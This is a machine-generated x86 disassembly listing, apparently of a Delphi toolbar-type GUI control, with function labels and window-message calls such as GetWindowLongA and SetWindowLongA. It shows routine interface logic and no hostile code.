mov edx eax
mov eax esi
call sub_43626c
sub_435278
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebx + 0x178 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ edi + 0x61 ] 0x0
jne r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x184 ]
mov si 0xffb2
call sub_403564
test al al
jne r-xdata
mov al 0x1
sub_4352c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4352e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_435304
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44aea0
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
call sub_434f10
cmp [ edi + 0x16a ] 0x0
jne r-xdata
mov edx [ esi + 0x80 ]
mov eax edi
call sub_434fac
cmp [ edi + 0x16c ] 0xffffffff
jne r-xdata
test bl bl
je r-xdata
sub_435368
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b0c0
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov dl [ ebx + 0x16a ]
mov edi esi
mov eax edi
call sub_455810
mov edx [ ebx + 0x16c ]
mov eax edi
call sub_455ab0
sub_4353ce
inc [ eax + eax * 8 - 0x7975d08c ]
jge r-xdata
add [ edi * 8 + 0x573022c ] al
add [ eax ] al
add al 0xfd
sub al 0x2
jae r-xdata
push eax
mov eax [ edi + 0x214 ]
push eax
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x210 ]
mov eax [ esi + 0x48 ]
jmp r-xdata
sub_435408
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42cb9c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x96
mov eax ebx
call sub_448748
mov edx 0x1d
mov eax ebx
call sub_44876c
mov dl 0x1
mov eax ebx
call sub_4484a0
mov dl [ r-xdata ]
mov eax ebx
call sub_42cbf0
mov [ ebx + 0x210 ] 0x17
mov [ ebx + 0x214 ] 0x16
mov [ ebx + 0x225 ] 0x0
mov [ ebx + 0x226 ] 0x0
mov [ ebx + 0x24c ] 0x1
mov [ ebx + 0x22c ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x218 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x220 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x234 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4368a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_436948
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x244 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4369ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov esi eax
mov [ ebx + 0x250 ] esi
mov edx 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax esi
call sub_427e2c
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4249a4
push 0x1
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x1
xor edx edx
xor eax eax
call sub_4062fc
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
call sub_427e2c
pop edx
call sub_424d48
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
call sub_43aed8
call sub_43afb8
mov [ ebx + 0x22a ] al
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4355bd
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_40371c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x250 ]
call sub_403368
mov eax [ ebp + 0x244 ]
call sub_403368
mov eax [ ebp + 0x23c ]
call sub_403368
mov eax [ ebp + 0x234 ]
call sub_403368
mov eax [ ebp + 0x218 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x218 ]
call sub_403368
mov eax [ ebp + 0x220 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_44b604
test bl bl
jle r-xdata
inc edi
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403704
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x218 ]
mov edx esi
call sub_4188a0
xor edx edx
mov [ eax + 0x184 ] edx
mov eax [ ebp + 0x218 ]
mov edx esi
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_435674
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_432f9c
mov [ ebx + 0x24c ] al
mov edx esi
mov eax ebx
call sub_44c640
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c56c
call sub_43aed8
call sub_43afb8
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ esi + 0x4 ]
or edx 0x4e
xor ecx ecx
mov cl [ ebx + 0x229 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x22a ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x225 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
mov [ esi + 0x4 ] eax
cmp [ ebx + 0x227 ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x8000
sub_435724
push ebx
push esi
push edi
add esp 0xffffffc8
mov ebx eax
mov eax ebx
call sub_44c76c
call sub_432ff0
cmp eax 0x40047
jl r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
push 0xd
call GetStockObject
mov esi eax
test esi esi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x455
mov eax ebx
call sub_44a180
mov esi eax
or esi 0x1
call sub_432ff0
cmp eax 0x50051
jl r-xdata
mov eax ebx
call sub_436c1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
add esp 0x38
pop edi
pop esi
pop ebx
retn
push 0x0
call GetDC
mov edi eax
test edi edi
je r-xdata
push esi
xor ecx ecx
mov edx 0x454
mov eax ebx
call sub_44a180
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
push esi
push edi
call SelectObject
mov esi eax
push esp
push edi
call GetTextMetricsA
test eax eax
je r-xdata
and esi 0xffffffef
or esi 0x10
jmp r-xdata
push esi
push edi
call SelectObject
push edi
push 0x0
call ReleaseDC
mov eax [ esp ]
sub eax [ esp + 0xc ]
sub eax [ esp + 0x10 ]
inc eax
mov [ ebx + 0x260 ] eax
sub_4357ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor edx edx
push ebp
push sub_435903
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44f790
push 0x0
mov ecx 0x14
mov edx 0x41e
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x248 ]
mov edx 0x42f
mov eax [ ebp - 0x4 ]
call sub_44a180
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
test eax eax
je r-xdata
mov edi [ eax + 0x34 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
test eax eax
je r-xdata
mov edi [ eax + 0x34 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx [ ebp - 0x8 ]
mov eax edi
call sub_406e7c
push eax
xor ecx ecx
mov edx 0x420
mov eax [ ebp - 0x4 ]
call sub_44a180
test ebx ebx
jg r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
mov edi [ eax + 0x34 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
test esi esi
jg r-xdata
mov ebx 0x1
mov edx esi
mov eax ebx
call sub_406e7c
push eax
xor ecx ecx
mov edx 0x41f
mov eax [ ebp - 0x4 ]
call sub_44a180
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43590a
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
mov esi 0x1
sub_43590a
mov eax [ ebp - 0x4 ]
call sub_436e78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_436368
mov eax [ ebp - 0x4 ]
call sub_436828
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x214 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_435b0c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc ebx
push 0x0
xor ecx ecx
mov edx 0x416
mov eax [ ebp - 0x4 ]
call sub_44a180
dec ebx
jne r-xdata
sub_435960
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi edx
mov edi eax
test [ edi + 0x1c ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
mov edx 0x417
mov eax edi
call sub_44a180
test eax eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
mov edx 0x41d
mov eax edi
call sub_44a180
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
mov ebx eax
test bl bl
je r-xdata
xor ecx ecx
push ebp
push sub_435a83
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_448974
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_448974
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x24 ]
sub edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp edx eax
jle r-xdata
mov eax edi
call sub_44f790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edi edx
sub edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x28 ]
push edx
push eax
mov ecx esi
add ecx edi
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
adc edi 0x0
sub_435a94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor eax eax
push ebp
push sub_435afe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436e78
mov esi eax
dec esi
sub ebx esi
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
dec ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_435960
dec esi
inc ebx
jne r-xdata
sub_435b0c
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi ecx
mov ebp edx
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
call sub_432ff0
cmp eax 0x40046
jl r-xdata
mov eax esi
call sub_436e78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
xor ecx ecx
mov edx 0x43a
mov eax esi
call sub_44a180
mov ebx eax
mov eax ebx
shr eax 0x10
mov [ edi ] eax
and ebx 0xffff
mov [ ebp ] ebx
jmp r-xdata
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
mov ecx ebx
mov edx 0x417
mov eax esi
call sub_44a180
test eax eax
je r-xdata
mov eax esp
push eax
mov ecx ebx
mov edx 0x41d
mov eax esi
call sub_44a180
test eax eax
je r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x41d
mov eax esi
call sub_44a180
test eax eax
je r-xdata
test [ esp + 0x19 ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebp ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi ] eax
jmp r-xdata
dec ebx
sub_435be4
push ebx
mov ebx eax
cmp edx [ ebx + 0x214 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x214 ] edx
call sub_43aed8
call sub_43afb8
cmp al 0x1
jne r-xdata
mov eax ebx
call sub_436c1c
mov eax ebx
call sub_44cd54
sub_435c14
push ebx
mov ebx eax
cmp edx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] edx
call sub_43aed8
call sub_43afb8
cmp al 0x1
jne r-xdata
mov eax ebx
call sub_436c1c
mov eax ebx
call sub_44cd54
sub_435c44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov [ esi + 0x184 ] ebx
mov edx esi
mov eax [ ebx + 0x218 ]
call sub_418744
mov edi eax
mov edx edi
mov eax ebx
call sub_43626c
mov edx esi
mov eax [ ebx + 0x218 ]
call sub_4188fc
test eax eax
jl r-xdata
mov edx edi
mov eax ebx
call sub_435a94
xor edx edx
mov eax ebx
call sub_435a94
jmp r-xdata
mov edx [ esi + 0x44 ]
push edx
mov ecx [ esi + 0x40 ]
mov edx eax
mov eax ebx
call sub_436e88
mov edi eax
mov ecx esi
mov edx edi
mov eax [ ebx + 0x218 ]
call sub_41891c
push edi
mov ecx edi
mov edx 0x415
mov eax ebx
call sub_435d90
jmp r-xdata
mov edx [ esi + 0x44 ]
push edx
mov ecx [ esi + 0x40 ]
mov edx eax
mov eax ebx
call sub_436fd4
mov edi eax
jmp r-xdata
mov eax ebx
call sub_436c1c
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
sub_435d00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x218 ]
call sub_4188fc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
call sub_418a3c
mov esi eax
cmp [ ebx + 0x226 ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x184 ] eax
push 0x0
mov ecx esi
mov edx 0x416
mov eax ebx
call sub_44a180
mov eax ebx
call sub_436e3c
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp [ ebx + 0x258 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_435a94
xor edx edx
mov eax ebx
call sub_435a94
jmp r-xdata
mov eax ebx
call sub_436c1c
sub_435d90
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1020 ] ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_435f5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ esi + 0x218 ]
call sub_4188a0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x14
call sub_402d24
mov al [ rw-data ]
mov [ ebp - 0x13 ] al
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xffffffff
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x14
call sub_402d24
mov al [ ebx + 0x17d ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0xffffffff
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebx + 0x16c ]
test edx edx
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov al [ rw-data ]
or [ ebp - 0x14 ] al
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x1c ] 0xfffffffe
jmp r-xdata
and eax 0x7f
mov al [ eax * 2 + rw-data ]
mov [ ebp - 0x13 ] al
mov edi ebx
cmp [ edi + 0x169 ] 0x0
je r-xdata
mov eax edi
call sub_434ccc
mov [ ebp - 0x14 ] al
cmp [ edi + 0x16b ] 0x0
je r-xdata
call sub_432ff0
cmp eax 0x40047
jl r-xdata
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x227 ] 0x0
je r-xdata
or [ ebp - 0x13 ] 0x4
or [ ebp - 0x13 ] 0x10
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1020 ]
mov eax edi
call sub_448fb4
cmp [ ebp - 0x1020 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44a180
test eax eax
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f62
lea eax [ ebp - 0x1020 ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404164
retn
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041fc
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_448fb4
jmp r-xdata
lea eax [ ebp - 0x101c ]
mov edx [ ebp - 0x8 ]
call sub_408a68
mov eax [ ebp - 0x8 ]
call sub_404424
mov [ ebp + eax - 0x101b ] 0x0
lea eax [ ebp - 0x101c ]
push eax
xor ecx ecx
mov edx 0x41c
mov eax esi
call sub_44a180
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_435f7c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1030 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_436143
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x218 ]
call sub_4188a0
mov ebx eax
lea eax [ ebp - 0x2c ]
xor ecx ecx
mov edx 0x20
call sub_402d24
mov [ ebp - 0x2c ] 0x20
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x7e
mov al [ rw-data ]
mov [ ebp - 0x1b ] al
mov ax [ ebx + 0x48 ]
mov [ ebp - 0x1a ] ax
mov [ ebp - 0x24 ] 0xffffffff
mov [ ebp - 0x18 ] ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] 0x7c
mov edi ebx
mov al [ edi + 0x17d ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
or [ ebp - 0x28 ] 0x1
mov edx [ edi + 0x16c ]
test edx edx
jge r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x20 ] 0xfffffffe
jmp r-xdata
mov dx [ edi + 0x48 ]
mov [ ebp - 0x1a ] dx
and eax 0x7f
mov al [ eax * 2 + rw-data ]
mov [ ebp - 0x1b ] al
cmp [ edi + 0x169 ] 0x0
je r-xdata
cmp [ edi + 0x16b ] 0x0
je r-xdata
or [ ebp - 0x1b ] 0x10
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x24 ] edx
mov eax edi
call sub_434ccc
mov [ ebp - 0x1c ] al
mov [ ebp - 0x18 ] ebx
cmp [ esi + 0x227 ] 0x0
je r-xdata
or [ ebp - 0x1b ] 0x4
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea edx [ ebp - 0x1030 ]
mov eax edi
call sub_448fb4
cmp [ ebp - 0x1030 ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44a180
test eax eax
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43614a
lea eax [ ebp - 0x1030 ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404164
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041fc
lea edx [ ebp - 0xc ]
mov eax edi
call sub_448fb4
jmp r-xdata
lea eax [ ebp - 0x102c ]
mov edx [ ebp - 0xc ]
call sub_408a68
mov eax [ ebp - 0xc ]
call sub_404424
mov [ ebp + eax - 0x102b ] 0x0
lea eax [ ebp - 0x102c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
call sub_404424
mov [ ebp - 0x10 ] eax
or [ ebp - 0x28 ] 0x2
jmp r-xdata
sub_436164
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor eax eax
push ebp
push sub_436259
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
and eax 0xefffffff
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
xor eax eax
push ebp
push sub_43623c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436e78
cmp ebx eax
jge r-xdata
xor eax eax
jmp r-xdata
push ebx
mov ecx ebx
mov edx 0x416
mov eax [ ebp - 0x4 ]
call sub_435d90
test al al
je r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436243
mov eax [ ebp - 0xc ]
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
retn
push ebx
mov ecx ebx
mov edx 0x415
mov eax [ ebp - 0x4 ]
call sub_435d90
test al al
jne r-xdata
mov al 0x1
sub_43626c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor eax eax
push ebp
push sub_43635a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f790
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
and eax 0xefffffff
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
xor eax eax
push ebp
push sub_43633d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436e78
cmp ebx eax
jge r-xdata
push ebx
mov ecx ebx
mov edx 0x415
mov eax [ ebp - 0x4 ]
call sub_435d90
push ebx
mov ecx ebx
mov edx 0x442
mov eax [ ebp - 0x4 ]
call sub_435f7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436344
mov eax [ ebp - 0x8 ]
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
retn
sub_436368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor eax eax
push ebp
push sub_436453
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f790
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
and eax 0xefffffff
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
xor eax eax
push ebp
push sub_436436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436e78
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43643d
mov eax [ ebp - 0x8 ]
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowLongA
retn
inc esi
xor ebx ebx
push ebx
mov ecx ebx
mov edx 0x415
mov eax [ ebp - 0x4 ]
call sub_435d90
push ebx
mov ecx ebx
mov edx 0x442
mov eax [ ebp - 0x4 ]
call sub_435f7c
jmp r-xdata
cmp edi ebx
jle r-xdata
inc ebx
dec esi
jne r-xdata
sub_43646c
push ebx
push esi
add esp 0xffffffec
mov esi edx
mov ebx eax
mov eax esp
push eax
mov ecx esi
mov edx 0x417
mov eax ebx
call sub_44a180
test eax eax
je r-xdata
add esp 0x14
pop esi
pop ebx
retn
mov dl [ esp + 0x8 ]
mov eax [ esp + 0xc ]
call sub_434db8
mov eax [ esp + 0xc ]
call sub_434ccc
and eax 0xff
xor edx edx
call sub_406de0
push eax
mov eax [ esp + 0x10 ]
call sub_435204
mov ecx eax
mov edx 0x411
mov eax ebx
call sub_44a180
sub_4364cc
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_43646c
mov eax [ edi + 0x218 ]
mov edx ebx
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_436510
push esi
mov esi eax
cmp dl [ esi + 0x227 ]
je r-xdata
pop esi
retn
